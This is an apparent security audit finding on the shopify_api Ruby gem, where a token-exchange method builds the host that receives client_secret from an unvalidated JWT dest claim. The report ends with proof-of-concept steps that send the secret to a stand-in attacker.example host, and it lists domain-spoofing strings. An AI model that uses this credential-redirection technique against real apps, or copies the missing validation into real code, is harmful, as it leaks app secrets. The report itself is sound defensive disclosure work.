### Title
Unvalidated JWT `dest` claim used to construct the `client_secret`-bearing token-exchange request host, bypassing `ShopValidator` - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the destination host for the `POST /admin/oauth/access_token` request — the request that carries the app's `client_id`/`client_secret` in its body — from `jwt_payload.shop`, which is taken verbatim from the JWT `dest` claim without ever passing it through `Utils::ShopValidator.sanitize!`. Every other credential-exchange code path in the gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) explicitly calls `Utils::ShopValidator.sanitize!(shop)` before constructing the session/host used for the token request. `exchange_token` is the outlier.

### Finding Description
`JwtPayload#shop` simply strips the `https://` prefix off the `dest` claim (`lib/shopify_api/auth/jwt_payload.rb`, `shop` method: `@dest.gsub("https://", "")`), with no domain-format or trusted-domain check at all — `dest` can be any string the token issuer put there. [1](#0-0) 

In `exchange_token`, this raw value is fed straight into `Session.new(shop: dest_shop)` and then into `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")`: [2](#0-1) 

`HttpClient#initialize` builds the request host directly from `session.shop` (`@base_uri = "https://#{api_host || session.shop}"`) whenever `Context.api_host` is not set: [3](#0-2) 

The subsequent `client.request(...)` call POSTs a body containing `client_id: Context.api_key` and `client_secret: Context.api_secret_key` to that host: [4](#0-3) 

This is a direct instance of the "host validated versus the host that receives the `client_secret`" identity-binding gap: `JwtPayload.new` only validates the JWT signature and the `aud` claim against `Context.api_key` (`lib/shopify_api/auth/jwt_payload.rb` lines 43-44) — it never checks that `dest`/`shop` is a trusted `*.myshopify.com`/`shopify.com`/`myshopify.io` domain. Compare with the sibling method in the very same file, `migrate_to_expiring_token`, which does call `Utils::ShopValidator.sanitize!(shop)` before building the session used for the identical `/admin/oauth/access_token` request: [5](#0-4) 

and with `ClientCredentials.client_credentials` / `RefreshToken.refresh_access_token`, which follow the same "sanitize before building session/host" pattern: [6](#0-5) [7](#0-6) 

`ShopValidator.sanitize!` exists specifically to reject non-Shopify hosts, path-injection tricks (`attacker.com/.myshopify.com`), lookalike domains (`test-shop.notmyshopify.com`), and userinfo tricks (`shop.myshopify.com@evil.com`): [8](#0-7) 

Since a session-token/ID-token in the embedded-app token-exchange flow is issued by App Bridge and delivered to the app's frontend, then forwarded by the app's backend into `exchange_token`, and since `JwtPayload` only checks the signature and `aud`, any well-formed token whose `dest` claim is set to an attacker-controlled string (a scenario possible if any part of the chain that produces/relays the token to the backend does not itself enforce shop format, e.g., a modified/relayed token, a dev/test token, or a future code path that constructs a JWT payload without an origin check) results in the app's `client_secret` being POSTed to `https://<attacker-controlled-dest>/admin/oauth/access_token`.

### Impact Explanation
This matches the required Critical impact class directly: "theft or exfiltration of ... the app's `client_secret`". If `dest_shop` is attacker-influenced, the app's `client_secret` (and `client_id`) are transmitted in a POST body to a host the attacker chose, unlike the sibling flows which are hardened via `ShopValidator.sanitize!`.

### Likelihood Explanation
Medium: this requires a JWT session token whose `dest` claim is not itself constrained to a legitimate Shopify domain reaching `exchange_token`. In the canonical Shopify App Bridge flow, `dest` is set by Shopify and signed with the shared secret, so in the fully-trusted intended flow this isn't reachable by an unprivileged attacker. However, the code path itself contains no defense-in-depth check that the rest of the gem's credential-exchange code enforces uniformly, making this an inconsistent trust boundary and a real regression risk (e.g., any future or alternate token-issuance path, non-Shopify-signed but otherwise correctly-audienced tokens, or test/relay tooling) compared to `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`, which all correctly sanitize the shop before it can influence where the `client_secret` is sent.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `migrate_to_expiring_token`) before constructing `shop_session`/`HttpClient`, and raise `Errors::InvalidShopError` on failure rather than trusting the JWT `dest` claim's format implicitly.

### Proof of Concept
1. Obtain/construct a JWT with a valid signature (HS256 with `Context.api_secret_key`) and `aud == Context.api_key`, but with `dest` set to `https://attacker.example` and `sub` per the JWT spec.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: forged_token, requested_token_type: ...)`.
3. `JwtPayload#shop` returns `"attacker.example"` unchanged (no domain check).
4. `Clients::HttpClient.new(session: Session.new(shop: "attacker.example"), base_path: "/admin/oauth")` sets `@base_uri = "https://attacker.example"`.
5. `client.request(...)` POSTs `{client_id, client_secret, grant_type, subject_token, ...}` to `https://attacker.example/admin/oauth/access_token`, leaking `Context.api_secret_key` to the attacker's host.
